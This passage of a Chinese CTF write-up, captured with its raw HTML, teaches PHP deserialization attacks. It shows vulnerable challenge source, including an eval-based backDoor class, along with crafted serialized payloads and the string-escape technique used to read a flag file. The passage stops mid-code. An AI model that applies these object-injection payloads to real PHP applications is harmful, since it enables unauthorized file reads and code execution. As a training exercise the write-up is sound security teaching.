class=\"language-php\">Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MzEwOiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVIjtzOjM6Im1zZyI7czoxOiJiIjtzOjI6InRvIjtzOjE6ImMiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6MzoibXNnIjtzOjE6ImIiO3M6MjoidG8iO3M6MToiYyI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>在cookie中新增msg，并将上面得到的base64字符赋值给它<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545346.png\" alt=\"在这里插入图片描述\"><br>此时再访问此界面即可得到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545351.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"0X02（字符串变少）\"><a href=\"#0X02（字符串变少）\" class=\"headerlink\" title=\"0X02（字符串变少）\"></a>0X02（字符串变少）</h3><p>源码如下</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n\n$function <span class=\"token operator\">=</span> @$_GET<span class=\"token punctuation\">[</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\nfunction <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>$img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $filter_arr <span class=\"token operator\">=</span> <span class=\"token function\">array</span><span class=\"token punctuation\">(</span><span class=\"token char\">'php'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'php5'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'php4'</span><span class=\"token punctuation\">,</span><span class=\"token char\">'fl1g'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    $filter <span class=\"token operator\">=</span> <span class=\"token char\">'/'</span><span class=\"token punctuation\">.</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token char\">'|'</span><span class=\"token punctuation\">,</span>$filter_arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token char\">'/i'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span>$filter<span class=\"token punctuation\">,</span><span class=\"token char\">''</span><span class=\"token punctuation\">,</span>$img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$_SESSION<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unset</span><span class=\"token punctuation\">(</span>$_SESSION<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n$_SESSION<span class=\"token punctuation\">[</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token char\">'guest'</span><span class=\"token punctuation\">;</span>\n$_SESSION<span class=\"token punctuation\">[</span><span class=\"token char\">'function'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> $function<span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>$function<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    echo '<span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token string\">\"index.php?f=highlight_file\"</span><span class=\"token operator\">></span>source_code<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span>'<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>$_GET<span class=\"token punctuation\">[</span><span class=\"token char\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $_SESSION<span class=\"token punctuation\">[</span><span class=\"token char\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token char\">'guest_img.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    $_SESSION<span class=\"token punctuation\">[</span><span class=\"token char\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span>$_GET<span class=\"token punctuation\">[</span><span class=\"token char\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n$serialize_info <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>$_SESSION<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$function <span class=\"token operator\">==</span> <span class=\"token char\">'highlight_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token char\">'index.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$function <span class=\"token operator\">==</span> <span class=\"token char\">'phpinfo'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token char\">'phpinfo();'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//maybe you can find something in here!</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>$function <span class=\"token operator\">==</span> <span class=\"token char\">'show_image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $userinfo <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>$serialize_info<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    echo <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span>$userinfo<span class=\"token punctuation\">[</span><span class=\"token char\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>说可能会在phpinfo中发现东西，这时候我们查看一下phpinfo<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545534.png\" alt=\"在这里插入图片描述\"><br>发现一个类似flag的文件，先在心中记下，此时回过头看代码</p>\n<p>这里发现<code>file_get_contents</code>函数，这个函数是可以读取文件的，这里的参数是base64解密后的<code>$userinfo[&#39;img&#39;]</code>，再观察这个参数，它是由参数<code>$serialize_info</code>反序列后得到的，再跟进这个<code>$serialize_info</code>查看，它是<code>filter(serialize($_SESSION))</code>，此时查看这个<code>filter()</code>函数发现它是一个过滤函数，当有php和flag时替换为空，那这里的话，按理说我们直接给<code>_SESSION[img]</code>赋值，就可以控制这个输出内容，但是呢我们会发现有这个东西</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>$_GET<span class=\"token punctuation\">[</span><span class=\"token char\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    $_SESSION<span class=\"token punctuation\">[</span><span class=\"token char\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token char\">'guest_img.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    $_SESSION<span class=\"token punctuation\">[</span><span class=\"token char\">'img'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span>$_GET<span class=\"token punctuation\">[</span><span class=\"token char\">'img_path'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>它控制了我们的<code> $_SESSION[&#39;img&#39;]</code>值，这个sha1算法是不可逆的，因此我们这里只能使img的内容为<code>guest_img.png</code>，看起来确实这里不能再突破了，但我们发现有这个<code>extract($_POST);</code>，它是一个变量覆盖函数，此时我们可以通过反序列化字符串逃逸，将我们自己设置的img传入，同时将另一个img抛弃，此时就成功反序列化并利用了这个<code>file_get_contents</code>函数，开始构造</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$function</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$filter_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php5'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'php4'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'fl1g'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'|'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filter_arr</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/i'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"user\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flagflag'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'function'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//随便传个值</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'img'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'ZDBnM19mMWFnLnBocA=='</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//这个是\td0g3_f1ag.php的base64编码</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$serialize_info</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$serialize_info</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>结果</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"a:3:&#123;s:4:\"</span>user<span class=\"token string\">\";s:8:\"</span>flagflag<span class=\"token string\">\";s:8:\"</span>function<span class=\"token string\">\";s:1:\"</span><span class=\"token number\">1</span><span class=\"token string\">\";s:3:\"</span>img<span class=\"token string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA<span class=\"token operator\">==</span><span class=\"token string\">\";&#125;\"</span>\n<span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">96</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"s:88:\"</span>a<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token string\">\"img\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token string\">\"ZDBnM19mMWFnLnBocA==\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token string\">\";\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>会发现下面的那个键名变空了，但长度仍为8，那它此时的键名就会往后取八个，也就是<code>&quot;;s:8:&quot;f</code>，但是此时它的这个格式与正常的是不同的，无法成功反序列化，我们可以使function这个全部内容变成键名的一部分，这个时候就是无问题的，也就是说，让它把<code>&quot;;s:8:&quot;function&quot;;s:1:&quot;1&quot;</code>给吃掉，而这部分一共是24个字符，我们的flag一个是吃4个，构造6个flag，就可以成功吃掉这个，而后我们的img就成功传入了，<br>此时修改<code>$_SESSION[&#39;function&#39;]</code>为<code>1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code><br>此时再运行得到</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">137</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"s:128:\"</span>a<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">24</span><span class=\"token operator\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">42</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token string\">\"img\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token string\">\"ZDBnM19mMWFnLnBocA==\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token string\">\";s:3:\"</span>img<span class=\"token string\">\";s:20:\"</span>ZDBnM19mMWFnLnBocA<span class=\"token operator\">==</span><span class=\"token string\">\";&#125;\"</span><span class=\"token punctuation\">;</span>\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这个时候就是正好没问题的，因为反序列化到<code>;&#125;</code>结束，后面的视为垃圾字符，不再查看<br>但是此时的话，我们是<code>a:3</code>，应该是有3个成员的，但是我们内容里，只有两个</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">1</span>、s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">24</span><span class=\"token operator\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">2</span>、s<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token string\">\"img\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token string\">\"ZDBnM19mMWFnLnBocA==\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>因此我们需要再构造一个成员，来使得内容完整</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">94</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"s:86:\"</span>a<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">24</span><span class=\"token operator\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token string\">\"img\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token string\">\"ZDBnM19mMWFnLnBocA==\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">6</span><span class=\"token operator\">:</span><span class=\"token string\">\"quan9i\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token string\">\";\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>此时的话就正好三个成员</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">1</span>、s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">24</span><span class=\"token operator\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">2</span>、s<span class=\"token operator\">:</span><span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token string\">\"img\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token string\">\"ZDBnM19mMWFnLnBocA==\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\"\n<span class=\"token number\">3</span>、s<span class=\"token operator\">:</span><span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">;</span>s<span class=\"token operator\">:</span><span class=\"token number\">6</span><span class=\"token operator\">:</span><span class=\"token string\">\"quan9i\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>此时去传值即可，这个输出函数是在<code>$function</code>为<code>show_image</code>时输出的，这个<code>$function</code>是由<code>$_GET[f]</code>控制的，因此我们get一个<code>f＝show_image</code>即可<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545537.png\" alt=\"在这里插入图片描述\"><br>表面<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545689.png\" alt=\"在这里插入图片描述\"><br>此时再将这个<code>/d0g3_f111111ag</code>进行base64加密，替代刚刚的base64就可以得到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141545829.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"绕过正则\"><a href=\"#绕过正则\" class=\"headerlink\" title=\"绕过正则\"></a>绕过正则</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token 